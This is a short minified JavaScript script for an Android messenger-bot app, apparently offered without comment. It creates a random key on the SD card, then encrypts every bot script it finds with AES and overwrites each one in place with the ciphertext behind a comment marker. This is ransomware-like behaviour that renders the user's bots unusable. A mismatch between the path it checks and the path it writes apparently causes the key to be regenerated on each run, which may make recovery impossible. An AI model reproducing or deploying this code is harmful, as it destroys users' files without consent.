function n(e,a){let t=r(a,Cipher.ENCRYPT_MODE).doFinal(java.lang.String(e).getBytes("UTF-8"));return Base64.getEncoder().encodeToString(t)}function w(e){const a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+€£¥₩.,";let t=[],r=0;for(;r<e;){let e=a[82*Math.random()>>0];t.includes(e)||(t+=e,r++)}return t}function r(e,a){let t=java.util.Arrays.copyOf(java.lang.String(e).getBytes("UTF-8"),16),r=new SecretKeySpec(t,"AES"),i=new IvParameterSpec(t),n=Cipher.getInstance("AES/CBC/PKCS5Padding");return n.init(a,r,i),n}importClass(java.util.Base64),importClass(javax.crypto.Cipher),importClass(javax.crypto.spec.SecretKeySpec),importClass(javax.crypto.spec.IvParameterSpec),FileStream.read("sdcard/Android/data/p")||FileStream.write("sdcard/Android/p",w(10));let key=FileStream.read("sdcard/Android/p"),h=[];java.io.File(com.xfl.msgbot.utils.SharedVar.Companion.botsPath).list().slice().forEach((e=>{let a=java.io.File(com.xfl.msgbot.utils.SharedVar.Companion.botsPath+"/"+e).listFiles().slice().find((e=>String(e).endsWith(".js"))),t=FileStream.read(a);if(null!=t)try{h.push({d:n(t,key),p:a})}catch(e){}})),h.map((e=>{FileStream.write(e.p,"//"+e.d)}));
